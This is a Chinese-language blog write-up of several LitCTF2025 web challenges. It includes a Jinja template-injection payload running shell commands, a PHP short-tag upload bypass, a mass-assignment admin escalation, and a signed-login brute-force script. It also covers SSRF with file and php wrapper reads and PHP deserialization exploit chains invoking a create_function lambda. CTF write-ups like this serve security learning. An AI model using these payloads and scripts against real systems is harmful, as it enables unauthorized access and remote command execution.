---
title: LitCTF2025（公开赛道）（web
date: 2025-08-30 18:19:31
updated: 2025-09-02 21:31:20
author: Xebdria
categories:
  - wp
  - 比赛
permalink: http://xendria.icu/index.php/2025/08/30/litctf2025%ef%bc%88%e5%85%ac%e5%bc%80%e8%b5%9b%e9%81%93%ef%bc%89%ef%bc%88web/
---
<!-- wp:heading -->
<h2 class="wp-block-heading">easy_file</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>首先是登入界面爆破发现账户密码是base64后的admin和password，进入界面<br>看源码也能看到是对其经过处理的</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":519,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="http://xendria.icu/wp-content/uploads/2025/08/7b6a140b-d641-4c8b-82db-922722fbb1c1-1024x329.png" alt="" class="wp-image-519"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>来到上传界面上传，经过测试是过滤了<?php,换成短标签<?就可以</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":520,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="http://xendria.icu/wp-content/uploads/2025/08/ca9f80e1-cd95-4dd2-91a7-345e9c5db6e4-1024x560.png" alt="" class="wp-image-520"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>上传成功，然后就有一个很抽象的点，admin.php下是可以进行file参数任意文件读取的（卡这半天，后面学长出了）后面就是大家都会的步骤了</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":521,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="http://xendria.icu/wp-content/uploads/2025/08/3a617127-6473-44eb-b07d-9cef8c6b51b1-1024x400.png" alt="" class="wp-image-521"/></figure>
<!-- /wp:image -->

<!-- wp:heading -->
<h2 class="wp-block-heading">星愿信箱</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>需要包含文字，过滤了{{吧，我们用{%绕过了，没有回显我们就加print这样</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":523,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="http://xendria.icu/wp-content/uploads/2025/08/b001abb5-197f-4715-a593-f3bcfcafda6a-1024x630.png" alt="" class="wp-image-523"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>然后用的是</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><code>{%print(lipsum.<strong>globals</strong>.<strong>builtins</strong>.<strong>import</strong>('os').popen('ls /
').read())%}</code></code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":524,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="http://xendria.icu/wp-content/uploads/2025/08/9586dfed-f910-48e5-bc1b-61f5275bb79a-1024x718.png" alt="" class="wp-image-524"/></figure>
<!-- /wp:image -->

<!-- wp:heading -->
<h2 class="wp-block-heading">nest_js</h2>
<!-- /wp:heading -->

<!-- wp:image {"id":525,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="http://xendria.icu/wp-content/uploads/2025/08/7d4a8fe9-9d98-4ec0-b1e1-fb7b3410f08f-1024x489.png" alt="" class="wp-image-525"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>账户密码admin passwor登入即送flag</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 class="wp-block-heading">多重宇宙日记</h2>
<!-- /wp:heading -->

<!-- wp:group {"layout":{"type":"flex","flexWrap":"nowrap"}} -->
<div class="wp-block-group"><!-- wp:paragraph -->
<p>先随便创造个用户登入进去进入这个界面</p>
<!-- /wp:paragraph --></div>
<!-- /wp:group -->

<!-- wp:image {"id":527,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="http://xendria.icu/wp-content/uploads/2025/08/c1fdcbae-6d61-493c-8b14-deb7a2fde108-1-1024x668.png" alt="" class="wp-image-527"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>我们看他的源码</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>       // 更新表单的JS提交
        document.getElementById('profileUpdateForm').addEventListener('submit', async function(event) {
            event.preventDefault();
            const statusEl = document.getElementById('updateStatus');
            const currentSettingsEl = document.getElementById('currentSettings');
            statusEl.textContent = '正在更新...';

            const formData = new FormData(event.target);
            const settingsPayload = {};
            // 构建 settings 对象，只包含有值的字段
            if (formData.get('theme')) settingsPayload.theme = formData.get('theme');
            if (formData.get('language')) settingsPayload.language = formData.get('language');
            // ...可以添加其他字段

            try {
                const response = await fetch('/api/profile/update', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ settings: settingsPayload }) // 包装在 "settings"键下
                });
                const result = await response.json();
                if (response.ok) {
                    statusEl.textContent = '成功: ' + result.message;
                    currentSettingsEl.textContent = JSON.stringify(result.settings, null, 2);
                    // 刷新页面以更新导航栏（如果isAdmin状态改变）
                    setTimeout(() => window.location.reload(), 1000);
                } else {
                    statusEl.textContent = '错误: ' + result.message;
                }
            } catch (error) {
                statusEl.textContent = '请求失败: ' + error.toString();
            }
        });</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>说明了需要让isAdmin=ture,我们发送<code>{ "settings": { "isAdmin": true } }</code>获得管理员面板</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":528,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="http://xendria.icu/wp-content/uploads/2025/08/c703c2de-b45a-42ea-8c1c-0f578604ab6d-1024x489.png" alt="" class="wp-image-528"/></figure>
<!-- /wp:image -->

<!-- wp:heading -->
<h2 class="wp-block-heading">easy_signin</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>界面是404，我们直接开扫<br></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":531,"sizeSlug":"full","linkDestination":"none"} -->
<figure class="wp-block-image size-full"><img src="http://xendria.icu/wp-content/uploads/2025/08/fbe7b77d-950b-4446-8aa4-0ab29dacb5aa-1.png" alt="" class="wp-image-531"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>分别是</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":532,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="http://xendria.icu/wp-content/uploads/2025/08/e1b29909-7ce5-4faa-8f12-036375cc0349-1024x282.png" alt="" class="wp-image-532"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":533,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="http://xendria.icu/wp-content/uploads/2025/08/7d6c4692-b12f-49f9-b936-ea5564d6cfec-1024x619.png" alt="" class="wp-image-533"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>源码有个api.js看看</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":535,"sizeSlug":"full","linkDestination":"none"} -->
<figure class="wp-block-image size-full"><img src="http://xendria.icu/wp-content/uploads/2025/08/ca58244c-32bb-4261-b147-32c688e191d7.png" alt="" class="wp-image-535"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>看见url第一反应就是127.0.0.1</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":536,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="http://xendria.icu/wp-content/uploads/2025/08/c1a3b900-4266-4e29-9179-20e027fefdd7-1024x354.png" alt="" class="wp-image-536"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>然后就卡住了，我们回到之前的登入界面看看他的逻辑，他给了</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>
 
        const loginBtn = document.getElementById('loginBtn');
        const passwordInput = document.getElementById('password');
        const errorTip = document.getElementById('errorTip');
        const rawUsername = document.getElementById('username').value; 

     
        loginBtn.addEventListener('click', async () => {
            const rawPassword = passwordInput.value.trim();
            if (!rawPassword) {
                errorTip.textContent = '请输入密码';
                errorTip.classList.add('show');
                passwordInput.focus();
                return;
            }

            const md5Username = CryptoJS.MD5(rawUsername).toString();   
            const md5Password = CryptoJS.MD5(rawPassword).toString();   

     
            const shortMd5User = md5Username.slice(0, 6);  
            const shortMd5Pass = md5Password.slice(0, 6);  

          
            const timestamp = Date.now().toString(); //五分钟

       
            const secretKey = 'easy_signin';  
            const sign = CryptoJS.MD5(shortMd5User + shortMd5Pass + timestamp + secretKey).toString();

            try {
                const response = await fetch('login.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'X-Sign': sign  
                    },
                    body: new URLSearchParams({
                        username: md5Username,   
                        password: md5Password,   
                        timestamp: timestamp
                    })
                });

                const result = await response.json();
                if (result.code === 200) {
                    alert('登录成功！');
                    window.location.href = 'dashboard.php'; 
                } else {
                    errorTip.textContent = result.msg;
                    errorTip.classList.add('show');
                    passwordInput.value = '';
                    passwordInput.focus();
                    setTimeout(() => errorTip.classList.remove('show'), 3000);
                }
            } catch (error) {
                errorTip.textContent = '网络请求失败';
                errorTip.classList.add('show');
                setTimeout(() => errorTip.classList.remove('show'), 3000);
            }
        });

        passwordInput.addEventListener('input', () => {
            errorTip.classList.remove('show');
        });
</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>通过这个我们可以知道他的密码的生成逻辑，直接叫ai搓一个</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>import requests
import hashlib
import time

# 配置参数
username = 'admin'  # 假设用户名已知，如果不同请修改
password_file = ''  # 密码字典文件路径
url = ''  # 登录URL，请替换为实际URL

# 计算用户名的MD5（固定值）
md5_user = hashlib.md5(username.encode()).hexdigest()

# 读取密码字典
try:
    with open(password_file, 'r') as f:
        passwords = [line.strip() for line in f.readlines()]
except FileNotFoundError:
    print(f"密码文件 {password_file} 未找到")
    exit(1)

# 遍历密码字典
for password in passwords:
    # 计算密码的MD5
    md5_pass = hashlib.md5(password.encode()).hexdigest()
    short_user = md5_user[:6]
    short_pass = md5_pass[:6]
    timestamp = str(int(time.time() * 1000))  # 当前毫秒时间戳
    sign_str = short_user + short_pass + timestamp + 'easy_signin'
    sign = hashlib.md5(sign_str.encode()).hexdigest()

    # 构造请求头和数据
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Sign': sign
    }
    data = {
        'username': md5_user,
        'password': md5_pass,
        'timestamp': timestamp
    }

    # 发送POST请求
    try:
        response = requests.post(url, headers=headers, data=data, timeout=5)
        # 检查响应状态码和内容
        if response.status_code == 200:
            # 假设成功响应中包含"success"关键字，根据实际响应调整
            if 'success' in response.text.lower():
                print(f"[+] 找到密码: {password}")
                break
            else:
                print(f"[-] 尝试密码: {password} 失败，响应: {response.text}")
        else:
            print(f"[-] 尝试密码: {password} 失败，状态码: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"[-] 请求异常 for password: {password}, error: {e}")

    # 可选：添加延迟避免请求过快
    # time.sleep(0.1)

print("爆破完成")</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>爆破出来是密码是admin123，依旧是让ai搓个登入后访问/dashboard.php</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">import requests<br>import hashlib<br>import time<br>import json<br><br># 配置参数<br>username = 'admin'  # 假设用户名为 'admin'，如果不是请修改<br>password = 'admin123'  # 已知的正确密码<br>login_url = 'http://node6.anna.nssctf.cn:20560/login.php'  # 请替换为实际的登录URL<br>dashboard_url = 'http://node6.anna.nssctf.cn:20560/dashboard.php'  # 请替换为实际的dashboard URL<br><br># 创建一个会话对象来保持cookies<br>session = requests.Session()<br><br># 计算用户名的MD5<br>md5_user = hashlib.md5(username.encode()).hexdigest()<br>print(f"用户 '{username}' 的MD5: {md5_user}")<br><br># 计算密码的MD5<br>md5_pass = hashlib.md5(password.encode()).hexdigest()<br>print(f"密码 '{password}' 的MD5: {md5_pass}")<br><br># 截取前6位<br>short_user = md5_user[:6]<br>short_pass = md5_pass[:6]<br>print(f"用户名MD5前6位: {short_user}")<br>print(f"密码MD5前6位: {short_pass}")<br><br># 生成时间戳（毫秒）<br>timestamp = str(int(time.time() * 1000))<br>print(f"时间戳: {timestamp}")<br><br># 计算签名<br>secret_key = 'easy_signin'<br>sign_str = short_user + short_pass + timestamp + secret_key<br>sign = hashlib.md5(sign_str.encode()).hexdigest()<br>print(f"签名字符串: {sign_str}")<br>print(f"签名MD5: {sign}")<br><br># 构造登录请求头和数据<br>headers = {<br>    'Content-Type': 'application/x-www-form-urlencoded',<br>    'X-Sign': sign,<br>    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'<br>}<br>data = {<br>    'username': md5_user,<br>    'password': md5_pass,<br>    'timestamp': timestamp<br>}<br><br>print("\n" + "=" * 50)<br>print("发送登录请求...")<br>print("=" * 50)<br><br># 发送登录POST请求<br>try:<br>    login_response = session.post(login_url, headers=headers, data=data)<br><br>    print(f"登录请求URL: {login_url}")<br>    print(f"请求方法: POST")<br>    print("\n登录请求头:")<br>    for key, value in headers.items():<br>        print(f"  {key}: {value}")<br><br>    print("\n登录请求体:")<br>    print(f"  {data}")<br><br>    print("\n" + "-" * 50)<br>    print(f"登录响应状态码: {login_response.status_code}")<br>    print(f"登录响应时间: {login_response.elapsed.total_seconds():.2f}秒")<br><br>    print("\n登录响应头:")<br>    for key, value in login_response.headers.items():<br>        print(f"  {key}: {value}")<br><br>    print("\n登录响应内容:")<br>    # 尝试解析JSON响应，如果不是JSON则直接显示文本<br>    try:<br>        json_response = login_response.json()<br>        print(json.dumps(json_response, indent=2, ensure_ascii=False))<br>    except ValueError:<br>        print(login_response.text)<br><br>    print("\n当前会话Cookies:")<br>    for cookie in session.cookies:<br>        print(f"  {cookie.name}: {cookie.value}")<br><br>    print("\n" + "=" * 50)<br>    if login_response.status_code == 200:<br>        print("[+] 登录请求发送成功!")<br>        # 这里可以根据实际响应内容判断是否登录成功<br>        if 'success' in login_response.text.lower() or '登录成功' in login_response.text:<br>            print("[+] 登录成功!")<br>        else:<br>            print("[-] 登录可能失败，请检查响应内容")<br>    else:<br>        print(f"[-] 登录请求失败，状态码: {login_response.status_code}")<br><br>except requests.exceptions.RequestException as e:<br>    print(f"[-] 登录请求异常: {e}")<br>    print(f"异常详情: {str(e)}")<br>    exit(1)<br><br># 访问 dashboard.php<br>print("\n\n" + "=" * 50)<br>print("访问 Dashboard...")<br>print("=" * 50)<br><br>try:<br>    dashboard_response = session.get(dashboard_url)<br><br>    print(f"Dashboard请求URL: {dashboard_url}")<br>    print(f"请求方法: GET")<br><br>    print("\nDashboard请求头:")<br>    # 显示发送到dashboard的请求头<br>    dashboard_headers = {<br>        'User-Agent': headers['User-Agent']<br>    }<br>    for key, value in dashboard_headers.items():<br>        print(f"  {key}: {value}")<br><br>    print("\n" + "-" * 50)<br>    print(f"Dashboard响应状态码: {dashboard_response.status_code}")<br>    print(f"Dashboard响应时间: {dashboard_response.elapsed.total_seconds():.2f}秒")<br><br>    print("\nDashboard响应头:")<br>    for key, value in dashboard_response.headers.items():<br>        print(f"  {key}: {value}")<br><br>    print("\nDashboard响应内容:")<br>    # 尝试解析JSON响应，如果不是JSON则直接显示文本<br>    try:<br>        json_response = dashboard_response.json()<br>        print(json.dumps(json_response, indent=2, ensure_ascii=False))<br>    except ValueError:<br>        # 如果是HTML，只显示前1000字符，避免控制台输出过多<br>        content = dashboard_response.text<br>        if len(content) > 1000:<br>            print(content[:1000] + "...\n[内容过长，已截断]")<br>        else:<br>            print(content)<br><br>    print("\n" + "=" * 50)<br>    if dashboard_response.status_code == 200:<br>        print("[+] Dashboard访问成功!")<br>    else:<br>        print(f"[-] Dashboard访问失败，状态码: {dashboard_response.status_code}")<br><br>except requests.exceptions.RequestException as e:<br>    print(f"[-] Dashboard请求异常: {e}")<br>    print(f"异常详情: {str(e)}")</pre>
<!-- /wp:preformatted -->

<!-- wp:image {"id":537,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="http://xendria.icu/wp-content/uploads/2025/08/cb89fdd7-d01a-4b76-8c09-4f1b03f45902-1024x671.png" alt="" class="wp-image-537"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>我们利用那个url参数打ssrf</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":538,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="http://xendria.icu/wp-content/uploads/2025/08/35ffd8bc-3253-4a40-b073-acb699bbdee9-1024x725.png" alt="" class="wp-image-538"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>这里可以用<code>ls /var/www/html</code>来找需要用二次编码（应该是快照和网页的两次解码），我们发现了327a6c4304ad5938eaf0efb6cc3e53dc.php</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":539,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="http://xendria.icu/wp-content/uploads/2025/08/031ac344-30c3-40ff-ad47-48c1210e15e7-1024x367.png" alt="" class="wp-image-539"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>访问得flag</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":540,"sizeSlug":"full","linkDestination":"none"} -->
<figure class="wp-block-image size-full"><img src="http://xendria.icu/wp-content/uploads/2025/08/67c5ba93-4a55-464a-87d6-6eee02a833c5.png" alt="" class="wp-image-540"/></figure>
<!-- /wp:image -->

<!-- wp:group {"layout":{"type":"flex","flexWrap":"nowrap"}} -->
<div class="wp-block-group"><!-- wp:paragraph -->
<p>还有一种方法说url参数那是能用php://(php大小写混用绕过即可)或者file://来读取源码或者urlcode.php的内容（没有去特意去看了)</p>
<!-- /wp:paragraph --></div>
<!-- /wp:group -->

<!-- wp:image {"id":542,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="http://xendria.icu/wp-content/uploads/2025/08/9474fe10-1c68-4fb2-8f09-d6466d0af787-1-1024x654.png" alt="" class="wp-image-542"/></figure>
<!-- /wp:image -->

<!-- wp:heading -->
<h2 class="wp-block-heading">君の名は</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>参考自<a href="https://www.cnblogs.com/Litsasuk/articles/18896993">https://www.cnblogs.com/Litsasuk/articles/18896993</a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><?php
highlight_file(__FILE__);
error_reporting(0);
create_function("", 'die(`/readflag`);');
class Taki
{
    private $musubi;
    private $magic;
    public function __unserialize(array $data)
    {
        $this->musubi = $data['musubi'];
        $this->magic = $data['magic'];
        return ($this->musubi)();
    }
    public function __call($func,$args){
        (new $args[0]($args[1]))->{$this->magic}();
    }
}

class Mitsuha
{
    private $memory;
    private $thread;
    public function __invoke()
    {
        return $this->memory.$this->thread;
    }
}

class KatawareDoki
{
    private $soul;
    private $kuchikamizake;
    private $name;

    public function __toString()
    {
        ($this->soul)->flag($this->kuchikamizake,$this->name);
        return "call error!no flag!";
    }
}

$Litctf2025 = $_POST['Litctf2025'];
if(!preg_match("/^[Oa]:[\d]+/i", $Litctf2025)){
    unserialize($Litctf2025);
}else{
    echo "把O改成C不就行了吗,笨蛋!～(∠・ω< )⌒☆";
}</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>我们的主要目的应该就是create_function("", 'die(`/readflag`);');，create_function()是用来创建匿名函数的，看到把O改成C很容易想到原生类<a href="https://chenxi9981.github.io/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9B%B8%E5%85%B3">https://chenxi9981.github.io/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9B%B8%E5%85%B3</a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>ArrayObject::unserialize
ArrayIterator::unserialize
RecursiveArrayIterator::unserialize
SplDoublyLinkedList::unserialize
SplQueue::unserialize
SplStack::unserialize
SplObjectStorage::unserialize</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>那思路应该就是利用原生类来调用匿名函数，找到ReflectionFunction的invoke方法可以调用函数</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":546,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="http://xendria.icu/wp-content/uploads/2025/08/1a25d29d-ff87-4313-bee2-9ff122f6f997-1024x477.png" alt="" class="wp-image-546"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>但是匿名函数怎么弄呢，可以直接用</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><?php
$a=create_function("", 'die(`/readflag`);');
var_dump(   $a);
#string(9) "\000lambda_1"</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>\000lambda_1这个就是名字了，但是匿名函数的函数名是会改变的，在web页面中打开php文件，每刷新一次函数名的数字就会加一，最好是重新开一下环境</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>Litsasuk师傅的exp
<?php
highlight_file(__FILE__);
error_reporting(0);
class Taki
{
    public $musubi;
    public $magic = "invoke";
}

class Mitsuha
{
    public $memory;
    public $thread;
}

class KatawareDoki
{
    public $soul;
    public $kuchikamizake = "ReflectionFunction";
    public $name = "\000lambda_1";
}
$a = new Taki();
$b = new Mitsuha();
$c = new KatawareDoki();

$a->musubi = $b;		// 1.把对象当成函数调用，触发__invoke()
$b->thread = $c;		// 2. 把对象作为字符串使用，触发__toString()
$c->soul = $a;			// 3. 调用不存在的方法，触发__call()

$arr=array("evil"=>$a);
$d=new ArrayObject($arr);
echo urlencode(serialize($d));</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>还有一个非预期，直接在<code>return ($this->musubi)();</code>处调用匿名函数</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><?php
highlight_file(__FILE__);
error_reporting(0);
class Taki
{
    public $musubi = "\000lambda_1";
    public $magic = "";
}
$a = new Taki();

$arr=array("evil"=>$a);
$d=new ArrayObject($arr);
echo urlencode(serialize($d));</code></pre>
<!-- /wp:code -->

<!-- wp:heading -->
<h2 class="wp-block-heading">总结</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>拖那么久才想起来复现，easy_signineasy_signin比赛时候没出来有点可惜，这题反序列化的话其实现在还是有点迷迷糊糊（本来基础不扎实），加油吧！<br>官方wp<a href="https://godyu.com/13917.html">https://godyu.com/13917.html</a></p>
<!-- /wp:paragraph -->